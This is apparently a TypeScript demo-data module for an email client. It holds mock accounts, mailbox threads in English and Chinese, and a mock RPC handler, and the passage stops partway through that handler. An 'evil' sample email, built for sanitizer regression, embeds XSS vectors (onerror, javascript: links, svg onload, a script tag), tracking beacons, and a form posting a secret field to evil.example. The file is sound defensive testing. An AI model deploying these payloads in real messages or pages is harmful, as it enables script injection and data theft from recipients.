/**
 * 演示数据（仅 `?demo=1` 且没有宿主 Sidecar 时启用）
 *
 * 用途：在没有邮箱账号的环境里预览界面、检查布局与交互。
 * 所有数据都保存在内存里，刷新页面即恢复初始状态；不会发起任何网络请求。
 */
import type {
  Account,
  Attachment,
  Bootstrap,
  Draft,
  DraftAttachment,
  Mailbox,
  MessageDetail,
  MessageSummary,
  OutboxItem,
  Settings,
  ThreadItem,
} from './rpc'

export const demoEnabled =
  typeof window !== 'undefined' && new URLSearchParams(window.location.search).has('demo')

const now = Date.now()
const second = 1_000
const minute = 60_000
const hour = 60 * minute
const day = 24 * hour

const settings: Settings = {
  theme: 'light',
  locale: 'zh-CN',
  density: 'comfortable',
  remoteImages: false,
  markReadOnOpen: true,
  undoDelay: 10,
  syncInterval: 5,
  syncScope: 'primary',
  initialLimit: 200,
  layout: 'split',
  conversations: true,
  pageSize: 60,
}

const accounts: Account[] = [
  {
    id: 1,
    email: 'dana@fernwood.example',
    displayName: 'Dana Reyes',
    username: 'dana@fernwood.example',
    provider: 'imap',
    authType: 'password',
    tenantId: '',
    clientId: '',
    imapHost: 'imap.fernwood.example',
    imapPort: 993,
    imapSecurity: 'tls',
    smtpHost: 'smtp.fernwood.example',
    smtpPort: 465,
    smtpSecurity: 'tls',
    signature: 'Dana Reyes\nHead of Product, Fernwood',
    color: '#e8660c',
    syncEnabled: true,
    syncInterval: 5,
    lastSyncAt: now - 2 * minute,
    lastError: '',
  },
  {
    id: 2,
    email: 'lin.chen@example.com',
    displayName: '陈琳',
    username: 'lin.chen@example.com',
    provider: 'imap',
    authType: 'password',
    tenantId: '',
    clientId: '',
    imapHost: 'imap.exmail.qq.com',
    imapPort: 993,
    imapSecurity: 'tls',
    smtpHost: 'smtp.exmail.qq.com',
    smtpPort: 465,
    smtpSecurity: 'tls',
    signature: '陈琳\n数字化中心',
    color: '#3584e4',
    syncEnabled: true,
    syncInterval: 10,
    lastSyncAt: now - 12 * minute,
    lastError: '',
  },
]

let mailboxId = 100
function mailbox(
  accountId: number,
  name: string,
  role: string,
  unread: number,
  total: number,
  order: number,
  synced = true,
): Mailbox {
  return {
    id: ++mailboxId,
    accountId,
    name,
    delimiter: '/',
    role,
    unread,
    total,
    // synced=false 表示这个文件夹从未同步过（自定义文件夹的初始状态）
    uidValidity: synced ? 1 : 0,
    lastUid: synced ? total : 0,
    selectable: true,
    sortOrder: order,
  }
}

const mailboxes: Mailbox[] = [
  mailbox(1, 'INBOX', 'inbox', 8, 1284, 0),
  mailbox(1, 'Sent', 'sent', 0, 322, 1),
  mailbox(1, 'Drafts', 'drafts', 1, 4, 2),
  mailbox(1, 'Archive', 'archive', 0, 640, 3),
  mailbox(1, 'Junk', 'junk', 0, 12, 4),
  mailbox(1, 'Trash', 'trash', 0, 0, 5),
  mailbox(2, 'INBOX', 'inbox', 3, 86, 0),
  mailbox(2, 'Sent Messages', 'sent', 0, 40, 1),
  mailbox(2, 'Drafts', 'drafts', 0, 1, 2),
  mailbox(2, 'Archive', 'archive', 0, 15, 3),
  mailbox(2, 'Junk', 'junk', 0, 2, 4),
  // 国内邮箱常见的第二个垃圾类文件夹，用来验证「同角色不重复显示同一个名字」
  mailbox(2, '广告邮件', 'junk', 0, 8, 5),
  mailbox(2, 'Trash', 'trash', 0, 0, 6),
  // 自定义文件夹：从未同步过，首次点开应自动拉一次
  mailbox(2, '订阅邮件', 'custom', 0, 12, 7, false),
]

const avatar = (initials: string, color: string) =>
  `data:image/svg+xml;utf8,${encodeURIComponent(
    `<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48"><rect width="48" height="48" rx="24" fill="${color}"/><text x="24" y="30" font-family="Segoe UI,Arial" font-size="17" font-weight="600" fill="#fff" text-anchor="middle">${initials}</text></svg>`,
  )}`

const inlineChart = avatar('图', '#2ec27e')

interface DemoMessage extends MessageDetail {
  threadKey: string
}

let nextId = 1000

function makeThread(input: {
  accountId: number
  mailboxRole: string
  subject: string
  fromName: string
  fromAddr: string
  to: string[]
  date: number
  snippet: string
  body: string
  unread?: boolean
  flagged?: boolean
  attachments?: Attachment[]
  html?: string
  messages?: Array<{
    fromName: string
    fromAddr: string
    to: string[]
    date: number
    body: string
    html?: string
  }>
}): { thread: ThreadItem; messages: DemoMessage[] } {
  const account = accounts.find((item) => item.id === input.accountId) ?? accounts[0]
  const box = mailboxes.find(
    (item) => item.accountId === input.accountId && item.role === input.mailboxRole,
  ) ?? mailboxes[0]
  const threadId = `thread-${nextId}`
  const baseMessage = buildMessage({
    threadId,
    mailbox: box,
    account,
    subject: input.subject,
    fromName: input.fromName,
    fromAddr: input.fromAddr,
    to: input.to,
    date: input.date,
    snippet: input.snippet,
    body: input.body,
    html: input.html,
    unread: input.unread,
    flagged: input.flagged,
    attachments: input.attachments,
  })

  const messages: DemoMessage[] = [baseMessage as DemoMessage]
  for (const extra of input.messages ?? []) {
    messages.push(
      buildMessage({
        threadId,
        mailbox: box,
        account,
        subject: input.subject,
        fromName: extra.fromName,
        fromAddr: extra.fromAddr,
        to: extra.to,
        date: extra.date,
        snippet: extra.body.slice(0, 120),
        body: extra.body,
        html: extra.html,
        unread: false,
        flagged: false,
        attachments: undefined,
      }) as DemoMessage,
    )
  }

  const latest = messages[messages.length - 1]
  const thread: ThreadItem = {
    threadId,
    subject: input.subject,
    snippet: input.snippet,
    date: latest.date,
    fromName: latest.fromName,
    fromAddr: latest.fromAddr,
    toAddrs: latest.toAddrs,
    accountId: input.accountId,
    accountEmail: account.email,
    accountColor: account.color,
    mailboxId: box.id,
    mailboxRole: box.role,
    latestId: latest.id,
    count: messages.length,
    unread: messages.filter((message) => !message.seen).length,
    flagged: messages.some((message) => message.flagged),
    hasAttachments: messages.some((message) => message.hasAttachments),
    answered: messages.some((message) => message.answered),
    participants: messages.map((message) => ({ name: message.fromName, email: message.fromAddr })),
  }
  return { thread, messages }
}

function buildMessage(input: {
  threadId: string
  mailbox: Mailbox
  account: Account
  subject: string
  fromName: string
  fromAddr: string
  to: string[]
  date: number
  snippet: string
  body: string
  html?: string
  unread?: boolean
  flagged?: boolean
  attachments?: Attachment[]
}): DemoMessage {
  const id = ++nextId
  const html =
    input.html ??
    `<div style="font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:15px;line-height:1.65;color:#1f1f23">
      ${input.body
        .split('\n\n')
        .map((paragraph) => `<p style="margin:0 0 12px">${paragraph.replace(/\n/g, '<br>')}</p>`)
        .join('')}
    </div>`
  const summary: MessageSummary = {
    id,
    accountId: input.account.id,
    mailboxId: input.mailbox.id,
    mailboxRole: input.mailbox.role,
    uid: id,
    messageId: `<${id}@demo>`,
    threadId: input.threadId,
    subject: input.subject,
    fromName: input.fromName,
    fromAddr: input.fromAddr,
    toAddrs: input.to,
    ccAddrs: [],
    date: input.date,
    size: 18_000,
    snippet: input.snippet,
    seen: !input.unread,
    flagged: Boolean(input.flagged),
    answered: false,
    draft: false,
    hasAttachments: (input.attachments ?? []).length > 0,
    bodyLoaded: true,
  }
  return {
    ...summary,
    threadKey: input.threadId,
    textBody: input.body,
    htmlBody: html,
    attachments: input.attachments ?? [],
    inReplyTo: '',
    references: [],
    accountEmail: input.account.email,
    accountName: input.account.displayName,
    signature: input.account.signature,
  }
}

const demoThreads: DemoMessage[][] = []

/*
 * 正文渲染回归样本：只有带 ?rich=1 时才挂进 demo 列表，日常演示不受影响。
 * scripts/render-check.mjs / render-check-dark.mjs 用它检查标题层级、列表圆点、
 * 表格边框、远程图片拦截与 <style> 作用域。
 * ?rich=2 换成「固定 700px 宽 + body{overflow:hidden}」的传统营销邮件模板，
 * 用来复现窄窗口下正文被裁切、滚不动的问题（scripts/render-check-scroll.mjs）。
 */
const demoSearch = new URLSearchParams(
  typeof window === 'undefined' ? '' : window.location.search,
)
const richParam = demoSearch.get('rich')
const richSample = richParam !== null
const scrollSample = richParam === '2'
/** ?evil=1：挂一封刻意构造的恶意邮件，供 scripts/sanitize-check.mjs 做注入回归 */
const evilSample = demoSearch.get('evil') !== null

const scrollSampleHtml = `<style>
  html, body { height: 100%; overflow: hidden; margin: 0; padding: 0; }
  body { font-family: -apple-system, "Segoe UI", Helvetica, Arial, sans-serif; font-size: 14px; color: #1f2328; background: #f4f5f7; }
  .wrap { width: 700px; margin: 0 auto; background: #ffffff; }
  .hero { background: #b3122f; color: #ffffff; padding: 28px 32px; }
  .hero h1 { margin: 0 0 8px; font-size: 26px; }
  .stat { display: inline-block; width: 30%; padding: 16px 0; text-align: center; }
  .stat b { display: block; font-size: 22px; color: #b3122f; }
</style>
<div class="wrap">
  <div class="hero">
    <div style="font-size:12px;letter-spacing:2px;opacity:.8">WEEKLY INTELLIGENCE</div>
    <h1>行业情报周报</h1>
    <div>2026-10-22 20:01 完成 · 耗时 4.9 分钟 · 新增 31 条</div>
  </div>
  <div style="padding:20px 32px">
    <div class="stat"><b>31 条</b>新增信息</div>
    <div class="stat"><b>4.9 分钟</b>执行耗时</div>
    <div class="stat"><b>1 条</b>警告</div>
  </div>
  ${Array.from({ length: 6 })
    .map(
      (_, index) => `<div style="margin:0 20px 18px;padding:16px;border:1px solid #e6e8eb">
    <div style="font-weight:700;margin-bottom:6px">${index + 1}. 发布日期：Wed, 21 Oct 2026 0${index}:00:00 GMT</div>
    <div style="color:#4a4a52;line-height:1.6">OpenAI built ChatGPT's ad stack to understand conversational intent and keep ads relevant; this entry exists to make the body tall enough that the reader definitely has to scroll.</div>
  </div>`,
    )
    .join('')}
</div>`

const richSampleHtml = `<style>
  body { font-family: -apple-system, "Segoe UI", Helvetica, Arial, sans-serif; font-size: 15px; color: #1f2328; background: #fffdf5; }
  .card { border: 1px solid #d1d9e0; border-radius: 8px; padding: 16px; }
  h2 { font-size: 18px; margin: 16px 0 8px; }
  @media (min-width: 900px) { h3 { letter-spacing: 0.06em; color: #0a7a44; } }
</style>
<div>
  <img src="https://github.example/assets/logo.png" width="48" height="48" alt="GitHub">
  <img src="https://tracker.example/pixel.gif" width="1" height="1" alt="">
  <h1>Validate catalog workflow run, Attempt #2</h1>
  <h2>Validate catalog, Attempt #2: All jobs have failed</h2>
  <div class="card">
    <img src="https://github.example/assets/hero.png" width="300" alt="hero">
    <p>Status &middot; Job &middot; Annotations</p>
  </div>
  <h3>Steps</h3>
  <ul>
    <li>Checkout repository</li>
    <li>Validate catalog
      <ul>
        <li>schema check failed: <code>catalog.yaml:42</code></li>
        <li>see <a href="https://example.com/log">run log</a></li>
      </ul>
    </li>
  </ul>
  <ol>
    <li>Install dependencies</li>
    <li>Run <code>pnpm validate</code></li>
  </ol>
  <blockquote>Failure in 5 seconds — exit code 1.</blockquote>
  <hr>
  <table border="1">
    <tr><th>Status</th><th>Job</th></tr>
    <tr><td>Failed</td><td>validate</td></tr>
  </table>
  <pre>Error: catalog entry "dbx-store" is missing field "owner"</pre>
  <img src="https://github.example/assets/footer.png" style="width:100%" alt="footer">
</div>`

{
  if (evilSample) {
    // 每条载荷都会往 window.__dbxXss 写标记：只要它出现，就说明注入成功了
    const evilSampleHtml = `<style>
  body { background: url(https://evil.example/track-body.png); }
  .lead { font-size: 15px; color: #1f2328; }
</style>
<div class="lead" style="background-image:url(https://evil.example/track-inline.png)">
  <p>这是一封用于注入回归的样例邮件，正文看起来一切正常。</p>
  <img src="x" onerror="window.__dbxXss = 'img-onerror'" alt="bad-image">
  <img src="https://evil.example/beacon.gif" width="1" height="1" alt="">
  <a href="javascript:window.__dbxXss='js-href'">看起来是普通链接</a>
  <a href="https://example.com/ok">正常链接</a>
  <iframe src="https://evil.example/frame"></iframe>
  <svg onload="window.__dbxXss='svg-onload'"><circle r="10"></circle></svg>
  <script>window.__dbxXss = 'script-tag'</script>
  <form action="https://evil.example/post"><input name="secret" value="1"></form>
  <p>结尾段落，用于确认正文仍然渲染。</p>
</div>`
    const item = makeThread({
      accountId: 1,
      mailboxRole: 'inbox',
      subject: '[安全回归] 含脚本与远程资源的邮件',
      fromName: 'Security Probe',
      fromAddr: 'probe@evil.example',
      to: ['dana@fernwood.example'],
      date: now - 30 * second,
      snippet: '这是一封用于注入回归的样例邮件，正文看起来一切正常。',
      unread: true,
      body: '这是一封用于注入回归的样例邮件，正文看起来一切正常。',
      html: evilSampleHtml,
    })
    demoThreads.push(item.messages)
  }
  if (richSample) {
    const item = makeThread({
      accountId: 1,
      mailboxRole: 'inbox',
      subject: '[t8y2/dbx-store] Validate catalog workflow run, Attempt #2',
      fromName: 'GitHub',
      fromAddr: 'notifications@github.com',
      to: ['dana@fernwood.example'],
      date: now - 2 * minute,
      snippet: 'Validate catalog, Attempt #2: All jobs have failed',
      unread: true,
      body: 'Validate catalog, Attempt #2: All jobs have failed',
      html: richSampleHtml,
    })
    demoThreads.push(item.messages)
  }
  if (scrollSample) {
    const item = makeThread({
      accountId: 1,
      mailboxRole: 'inbox',
      subject: '行业情报周报 · 2026 第 43 周',
      fromName: '情报服务',
      fromAddr: 'digest@intel.example',
      to: ['dana@fernwood.example'],
      date: now - 1 * minute,
      snippet: '2026-10-22 20:01 完成 · 耗时 4.9 分钟 · 新增 31 条',
      unread: true,
      body: '2026-10-22 20:01 完成 · 耗时 4.9 分钟 · 新增 31 条',
      html: scrollSampleHtml,
    })
    demoThreads.push(item.messages)
  }
}
// ==== 临时样例结束 ====

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Q4 roadmap review',
    fromName: 'Priya Raman',
    fromAddr: 'priya@fernwood.example',
    to: ['dana@fernwood.example', 'jonas@fernwood.example'],
    date: now - 32 * minute,
    snippet:
      'Hi both, I’ve put the Q4 roadmap draft in the shared folder. The big open question is whether the offline editor ships…',
    unread: true,
    body: `Hi both,

I’ve put the Q4 roadmap draft in the shared folder. The big open question is whether the offline editor ships in October or slips to November. Everything else has room.

Dana, can you sanity-check Jonas’s estimate before Friday? If last-write-wins is acceptable to support, I’m happy to commit to October.

Priya Raman
Head of Product, Fernwood`,
    html: `<div style="font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:15px;line-height:1.7;color:#1f1f23">
      <p style="margin:0 0 14px">Hi both,</p>
      <p style="margin:0 0 14px">I’ve put the Q4 roadmap draft in the shared folder. The big open question is whether the offline editor ships in October or slips to November. Everything else has room.</p>
      <p style="margin:0 0 14px">Dana, can you sanity-check Jonas’s estimate before Friday? If last-write-wins is acceptable to support, I’m happy to commit to October.</p>
      <p style="margin:0 0 4px">Priya Raman</p>
      <p style="margin:0;color:#6e6e76">Head of Product, Fernwood</p>
      <div style="margin-top:18px;padding:12px 14px;border:1px solid #ececef;border-radius:10px;background:#fafafb">
        <div style="font-size:12px;color:#6e6e76;margin-bottom:8px">离线编辑器 · 交付估算</div>
        <img src="${inlineChart}" alt="chart" style="max-width:100%;border-radius:8px">
      </div>
    </div>`,
    messages: [
      {
        fromName: 'Jonas Weber',
        fromAddr: 'jonas@fernwood.example',
        to: ['priya@fernwood.example', 'dana@fernwood.example'],
        date: now - 26 * minute,
        body: `Left my comments. Short version: October is possible if we cut sync conflict resolution down to last-write-wins for the first release.`,
      },
    ],
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Your tickets: Lisbon to Porto, Friday an…',
    fromName: 'CP Comboios',
    fromAddr: 'bilhetes@cp.example',
    to: ['dana@fernwood.example'],
    date: now - 3 * hour,
    snippet:
      'Your booking is confirmed. The calendar file attached holds both journeys. Show the QR code at the gate.',
    unread: true,
    flagged: false,
    attachments: [
      {
        index: 2,
        filename: 'lisbon-porto.ics',
        mime: 'text/calendar',
        size: 2048,
        contentId: '',
        inline: false,
      },
      {
        index: 3,
        filename: 'tickets.pdf',
        mime: 'application/pdf',
        size: 128_400,
        contentId: '',
        inline: false,
      },
    ],
    body: `Hello Dana,

Your booking is confirmed: Lisbon Oriente → Porto Campanhã, Friday 18:09, coach 4, seat 12A.

The calendar file attached holds both journeys. Show the QR code at the gate.

CP Comboios`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Saturday hike?',
    fromName: 'Mara Okafor',
    fromAddr: 'mara.okafor@example.com',
    to: ['dana@fernwood.example', 'priya@fernwood.example'],
    date: now - 4 * hour,
    snippet:
      'Theo’s in. Meet at mine at 7:45 and we’ll drive up together. Bring layers, it’ll be cold at the top.',
    unread: true,
    body: `Theo’s in. Meet at mine at 7:45 and we’ll drive up together. Bring layers, it’ll be cold at the top.`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Thesis chapter 3 feedback',
    fromName: 'Prof. Kemi Adeyemi',
    fromAddr: 'k.adeyemi@uni.example',
    to: ['dana@fernwood.example'],
    date: now - 7 * hour,
    snippet:
      'Dear Dana, I’ve read chapter 3. The methodology section is much stronger than in the last draft, but the sample…',
    unread: true,
    body: `Dear Dana,

I’ve read chapter 3. The methodology section is much stronger than in the last draft, but the sample description still needs work. Send me a revised version by the end of the month and we can talk through the analysis.

Kemi`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Updated invitation: Sprint planning',
    fromName: 'Jonas Weber',
    fromAddr: 'jonas@fernwood.example',
    to: ['dana@fernwood.example'],
    date: now - 1 * day,
    snippet: 'Moved this so the whole team can make it. Same room, Jonas',
    body: `Moved this so the whole team can make it.

Same room, Jonas`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Invitation: Offline editor design review',
    fromName: 'Priya Raman',
    fromAddr: 'priya@fernwood.example',
    to: ['dana@fernwood.example'],
    date: now - 1 * day - 2 * hour,
    snippet:
      'Walking through the offline editor design before we commit to a date. Agenda in the description.',
    unread: true,
    flagged: true,
    body: `Walking through the offline editor design before we commit to a date.

Agenda in the description.`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Your September statement is ready',
    fromName: 'Juniper Bank',
    fromAddr: 'statements@juniper.example',
    to: ['dana@fernwood.example'],
    date: now - 1 * day - 6 * hour,
    snippet: 'Your September statement is ready to view.',
    body: `Your September statement is ready to view.

This message was sent from an unmonitored address.`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'inbox',
    subject: 'Allotment rota for October',
    fromName: 'Tomas Silva',
    fromAddr: 'tomas@allotment.example',
    to: ['dana@fernwood.example'],
    date: now - 2 * day,
    snippet: 'Hi all, rota attached. Two slots still open on the 18th and 25th.',
    unread: true,
    body: `Hi all,

Rota attached. Two slots still open on the 18th and 25th — reply here if you can take one.

Tomas`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 2,
    mailboxRole: 'inbox',
    subject: '数据中台二期验收材料',
    fromName: '王磊',
    fromAddr: 'wang.lei@example.com',
    to: ['lin.chen@example.com'],
    date: now - 55 * minute,
    snippet: '陈琳，二期验收材料已按模板整理完毕，请确认数据质量报告的口径是否一致。',
    unread: true,
    flagged: true,
    attachments: [
      {
        index: 2,
        filename: '二期验收材料.xlsx',
        mime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        size: 3_240_000,
        contentId: '',
        inline: false,
      },
    ],
    body: `陈琳，

二期验收材料已按模板整理完毕，请确认数据质量报告的口径是否一致。如果没问题，我约周四下午评审。

王磊`,
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 2,
    mailboxRole: 'inbox',
    subject: 'Re: 11 月值班表',
    fromName: '赵敏',
    fromAddr: 'zhao.min@example.com',
    to: ['lin.chen@example.com'],
    date: now - 5 * hour,
    snippet: '11 月 8 日我出差，能否和 15 日对调一下？谢谢。',
    unread: true,
    body: `陈琳，

11 月 8 日我出差，能否和 15 日对调一下？谢谢。

赵敏`,
    messages: [
      {
        fromName: '陈琳',
        fromAddr: 'lin.chen@example.com',
        to: ['zhao.min@example.com'],
        date: now - 6 * hour,
        body: `各位，11 月值班表初稿已发，请在本周内确认。`,
      },
    ],
  })
  demoThreads.push(item.messages)
}

{
  const item = makeThread({
    accountId: 1,
    mailboxRole: 'sent',
    subject: 'Re: Q4 roadmap review',
    fromName: 'Dana Reyes',
    fromAddr: 'dana@fernwood.example',
    to: ['priya@fernwood.example'],
    date: now - 20 * minute,
    snippet: 'Thanks, Priya. I checked Jonas’s estimate: last-write-wins is fine for October.',
    body: `Thanks, Priya. I checked Jonas’s estimate: last-write-wins is fine for October, and I can support it.`,
  })
  demoThreads.push(item.messages)
}

const allMessages = demoThreads.flat()
const messageById = new Map<number, DemoMessage>()
for (const message of allMessages) messageById.set(message.id, message)

const drafts: Draft[] = []
const outbox: OutboxItem[] = []
const contacts = Array.from(
  new Map(
    allMessages
      .map((message) => ({ name: message.fromName, email: message.fromAddr }))
      .concat([
        { name: 'Priya Raman', email: 'priya@fernwood.example' },
        { name: 'Jonas Weber', email: 'jonas@fernwood.example' },
        { name: '王磊', email: 'wang.lei@example.com' },
      ])
      .map((item) => [item.email, item]),
  ).values(),
)

let draftId = 0
let outboxId = 0

function counts() {
  return {
    inboxUnread: mailboxes.filter((item) => item.role === 'inbox').reduce((sum, item) => sum + item.unread, 0),
    starred: allMessages.filter((message) => message.flagged).length,
    drafts: drafts.length,
    outbox: outbox.filter((item) => item.status === 'queued').length,
  }
}

function bootstrap(): Bootstrap {
  return {
    version: '0.1.4',
    dataDir: 'C:\\Users\\demo\\AppData\\Roaming\\dbx-mail',
    vault: 'keyring',
    platform: 'windows',
    accounts,
    mailboxes,
    settings,
    counts: counts(),
  }
}

function matchesThread(thread: ThreadItem, params: Record<string, unknown>): boolean {
  const mailboxIdFilter = params.mailboxId as number | undefined
  const role = params.role as string | undefined
  const accountId = params.accountId as number | undefined
  const query = String(params.query ?? '').trim().toLowerCase()
  const kind = String(params.kind ?? 'all')

  if (mailboxIdFilter && thread.mailboxId !== mailboxIdFilter) return false
  if (role === 'starred' && !thread.flagged) return false
  if (role === 'inbox' && thread.mailboxRole !== 'inbox') return false
  if (role && !['starred', 'all', 'inbox'].includes(role) && thread.mailboxRole !== role) return false
  if (accountId && thread.accountId !== accountId) return false
  if (query) {
    const haystack = `${thread.subject} ${thread.snippet} ${thread.fromName} ${thread.fromAddr}`.toLowerCase()
    if (!haystack.includes(query)) return false
  }
  if (kind === 'unread' && thread.unread === 0) return false
  if (kind === 'flagged' && !thread.flagged) return false
  if (kind === 'files' && !thread.hasAttachments) return false
  return true
}

function delay<T>(value: T, ms = 120): Promise<T> {
  return new Promise((resolve) => setTimeout(() => resolve(value), ms))
}

const demoDirs = [
  { name: 'Desktop', path: 'C:\\Users\\demo\\Desktop' },
  { name: 'Documents', path: 'C:\\Users\\demo\\Documents' },
  { name: 'Downloads', path: 'C:\\Users\\demo\\Downloads' },
  { name: 'Pictures', path: 'C:\\Users\\demo\\Pictures' },
]

const pdfPart = btoa('%PDF-1.4 demo attachment')

export function demoInvoke(method: string, rawParams: unknown): Promise<unknown> {
  const params = (rawParams ?? {}) as Record<string, unknown>
  switch (method) {
    case 'ping':
      return Promise.resolve({ ok: true, version: '0.1.4' })
    case 'app/bootstrap':
      return delay(bootstrap(), 80)
    case 'app/info':
      return Promise.resolve({
        version: '0.1.4',
        dataDir: 'C:\\Users\\demo\\AppData\\Roaming\\dbx-mail',
        vault: 'keyring',
        platform: 'windows',
      })
    case 'account/presets':
      return Promise.resolve({
        items: [
          {
            key: 'gmail',
            label: 'Gmail',
            domains: ['gmail.com'],
            imapHost: 'imap.gmail.com',
            imapPort: 993,
            imapSecurity: 'tls',
            smtpHost: 'smtp.gmail.com',
            smtpPort: 587,
            smtpSecurity: 'starttls',
            hint: '需要在 Google 账号中生成「应用专用密码」',
          },
          {
            key: 'qq',
            label: 'QQ 邮箱',
            domains: ['qq.com'],
            imapHost: 'imap.qq.com',
            imapPort: 993,
            imapSecurity: 'tls',
            smtpHost: 'smtp.qq.com',
            smtpPort: 465,
            smtpSecurity: 'tls',
            hint: '使用 QQ 邮箱授权码',
          },
        ],
      })
    case 'account/test':
      return delay({ ok: true, lines: ['IMAP 登录成功', '发现 6 个文件夹', 'SMTP 连接成功'] }, 700)
    case 'account/add': {
      const email = String(params.email ?? 'new@example.com')
      const account: Account = {
        ...accounts[0],
        id: accounts.length + 1,
        email,
        displayName: String(params.displayName ?? email),
        username: String(params.username ?? email),
        signature: String(params.signature ?? ''),
      }
      accounts.push(account)
      return delay({ account, vault: 'keyring', warnings: [] }, 400)
    }
    case 'account/update': {
      const id = Number(params.id)
      const index = accounts.findIndex((item) => item.id === id)
      if (index >= 0) {
        accounts[index] = { ...accounts[index], ...(params as unknown as Account) }
        return Promise.resolve({ account: accounts[index] })
      }
      return Promise.reject(new Error('账户不存在'))
    }
    case 'account/remove': {
      const id = Number(params.id)
      const index = accounts.findIndex((item) => item.id === id)
      if (index >= 0) accounts.splice(index, 1)
      return Promise.resolve({ deleted: true })
    }
    case 'account/discover':
      return Promise.resolve({ mailboxes })
    case 'mailbox/list':
      return Promise.resolve({ items: mailboxes })
    case 'sync/now':
      return delay({ reports: [{ accountId: 1, newMessages: 0 }], errors: [] }, 900)
    case 'sync/status':
      return Promise.resolve({ running: [], log: [] })
    case 'mail/list': {
      const limit = Number(params.limit ?? settings.pageSize)
      const offset = Number(params.offset ?? 0)
      const items = demoThreads
        .map((messages) => {
          const latest = messages[messages.length - 1]
          const thread = {
            threadId: latest.threadId,
            subject: latest.subject,
            snippet: latest.snippet,
            date: latest.date,
            fromName: latest.fromName,
            fromAddr: latest.fromAddr,
            toAddrs: latest.toAddrs,
            accountId: latest.accountId,
            accountEmail: accounts.find((item) => item.id === latest.accountId)?.email ?? '',
            accountColor: accounts.find((item) => item.id === latest.accountId)?.color ?? '#e8660c',
            mailboxId: latest.mailboxId,
            mailboxRole: latest.mailboxRole,
            latestId: latest.id,
            count: messages.length,
            unread: messages.filter((message) => !message.seen).length,
            flagged: messages.some((message) => message.flagged),
            hasAttachments: messages.some((message) => message.hasAttachments),
            answered: messages.some((message) => message.answered),
            participants: messages.map((message) => ({ name: message.fromName, email: message.fromAddr })),
          }
          return thread
        })
        .filter((thread) => matchesThread(thread, params))
        .sort((left, right) => right.date - left.date)
      return delay({ items: items.slice(offset, offset + limit), offset, limit }, 150)
    }
    case 'mail/thread': {
      const threadId = String(params.threadId)
      const items = allMessages
        .filter((message) => message.threadId === threadId)
        .sort((left, right) => left.date - right.date)
      return Promise.resolve({ items })
    }
    case 'mail/open': {
      const id = Number(params.id)
      const message = messageById.get(id)
      if (!message) return Promise.reject(new Error('邮件不存在'))
      message.seen = true
      return delay(message, 180)
    }
    case 'mail/flags': {
      const ids = (params.ids as number[]) ?? []
      for (const id of ids) {
        const message = messageById.get(id)
        if (!message) continue
        if (typeof params.seen === 'boolean') message.seen = params.seen
        if (typeof params.flagged === 'boolean') message.flagged = params.flagged
        if (typeof params.answered === 'boolean') message.answered = params.answered
      }
      return Promise.resolve({ ok: true })
    }
    case 'mail/move': {
      const ids = (params.ids as number[]) ?? []
      const destination = params.destination as { kind: string; mailboxId?: number }
      for (const id of ids) {
        const message = messageById.get(id)
        if (!message) continue
        const accountBoxes = mailboxes.filter((item) => item.accountId === message.accountId)
        const target =
          destination.kind === 'mailbox'
            ? accountBoxes.find((item) => item.id === destination.mailboxId)
            : accountBoxes.find((item) => item.role === (destination.kind === 'trash' ? 'trash' : destination.kind))
        if (target) {
          message.mailboxId = target.id
          message.mailboxRole = target.role
        }
        if (destination.kind === 'trash' && message.mailboxRole === 'trash') {
          messageById.delete(id)
        }
      }
      return delay({ ok: true }, 240)
    }
    case 'mail/part': {
      const index = Number(params.index)
      const name = index === 2 ? 'tickets.pdf' : 'attachment.bin'
      return delay({
        name,
        mime: name.endsWith('.pdf') ? 'application/pdf' : 'application/octet-stream',
        size: pdfPart.length,
        dataBase64: pdfPart,
      })
    }
    case 'mail/export':
      return delay({ paths: ['C:\\Users\\demo\\Downloads\\DBX 邮件\\message.eml'], dir: 'C:\\Users\\demo\\Downloads\\DBX 邮件' })
    case 'mail/import':
      return Promise.resolve({ id: ++nextId })
    case 'mail/fetchImage':
      return Promise.resolve({ mime: 'image/svg+xml', dataUrl: avatar('图', '#3584e4') })
    case 'compose/send': {
      const id = ++outboxId
      const scheduledAt = Number(params.scheduledAt ?? now + 5000)
      outbox.unshift({
        id,
        accountId: Number(params.accountId ?? 1),
        accountEmail: accounts[0].email,
        toAddrs: (params.to as string[]) ?? [],
        ccAddrs: (params.cc as string[]) ?? [],
        bccAddrs: (params.bcc as string[]) ?? [],
        subject: String(params.subject ?? ''),
        bodyHtml: String(params.html ?? ''),
        attachments: (params.attachments as DraftAttachment[]) ?? [],
        scheduledAt,
        status: 'queued',
        error: '',
        attempts: 0,
        createdAt: Date.now(),
        sentAt: 0,
        inReplyTo: String(params.inReplyTo ?? ''),
        references: (params.references as string[]) ?? [],
      })
      window.setTimeout(() => {
        const item = outbox.find((entry) => entry.id === id)
        if (item && item.status === 'queued') {
          item.status = 'sent'
          item.sentAt = Date.now()
        }
      }, 4000)
      return delay({ outboxId: id, scheduledAt, undoSeconds: settings.undoDelay }, 300)
    }
    case 'draft/list':
      return Promise.resolve({ items: drafts })
    case 'draft/save': {
      const incoming = params as unknown as Draft
      const id = incoming.id || ++draftId
      const record: Draft = { ...incoming, id, updatedAt: Date.now(), createdAt: incoming.createdAt || Date.now() }
      const index = drafts.findIndex((item) => item.id === id)
      if (index >= 0) drafts[index] = record
      else drafts.unshift(record)
      return delay({ id, updatedAt: record.updatedAt }, 60)
    }
    case 'draft/delete': {
